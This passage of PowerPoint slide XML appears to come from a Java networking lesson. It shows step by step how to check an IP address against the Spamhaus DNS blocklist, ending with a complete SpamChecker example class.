            <a:ext cx="11887200" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STEP1: Reverse the IP Address</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>reverseIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>    byte[] bytes = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>addr.getAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>    return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>String.format</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>("%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>d.%d.%d.%d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>", bytes[3] &amp; 0xFF, bytes[2] &amp; 0xFF, bytes[1] &amp; 0xFF, bytes[0] &amp; 0xFF);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3294050" y="1798994"/>
            <a:ext cx="6096541" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STEP2:Construct the DNSBL Query</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Append to a blocklist domain (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Spamhaus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> SBL): </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>String query = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>reverseIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>) + ".sbl.spamhaus.org";</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3363853"/>
            <a:ext cx="7684558" cy="3139321"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STEP3: Perform DNS Lookup</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>boolean</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>isSpammer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>    try {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>        String query = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>reverseIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>) + ".sbl.spamhaus.org";</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>InetAddress.getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>(query); // Throws if no record</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>        return true;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>    } catch (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> e) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>        return false;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6342320" y="5495567"/>
            <a:ext cx="5427133" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STEP4:Interpret Results</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Resolved IP: Spammer (listed in blocklist).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>: Clean IP.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"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457200" y="228600"/>
            <a:ext cx="10668000" cy="6001643"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Java Implementation: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>“Example Spam Check IP address : 207.34.56.23"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>boolean</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>isSpammer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>(String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>) throws </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>    String[] octets = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>ip.split</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>("\\.");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>//Splits the IP string into an array of strings, breaking it at each dot (.).  ( using \\.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00B050"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>    String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>reversedIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> = octets[3] + "." + octets[2] + "." + octets[1] + "." + octets[0];</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>    String query = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>reversedIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> + ".sbl.spamhaus.org";</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>    try {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress.getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>(query); // Throws if not found</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>        return true;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>    } catch (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t> e) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>        return false;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1"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44B3544-4017-4840-ADCA-E1F247AFEA33}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="152400" y="409853"/>
            <a:ext cx="7315200" cy="6340197"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>import java.net.*;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>SpamChecker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>    public static void main(String[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>) throws Exception {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> = "207.34.56.23";  // Example IP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>isSpammer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>)) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> + " is a known spammer!");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        } else {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>System.out.println</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> + " is clean.");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>    static </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>boolean</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>isSpammer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>(String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>) throws </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        // 1. Split IP into 4 parts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        String[] octets = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>ip.split</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>("\\.");  // ["207", "34", "56", "23"]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        // 2. Reverse the octets</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>reversedIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> = octets[3] + "." + octets[2] + "." + octets[1] + "." + octets[0];</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        // "23.56.34.207"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        // 3. Query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>Spamhaus</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> DNSBL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        String query = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>reversedIP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> + ".sbl.spamhaus.org";</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        try {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>InetAddress.getByName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>(query);  // Throws if not found</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>            return true;  // IP is blacklisted</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>        } catch (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0" err="1"/>
              <a:t>UnknownHostException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t> e) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0"/>
              <a:t>            return false;  // IP is clean</a:t>
            </a:r>
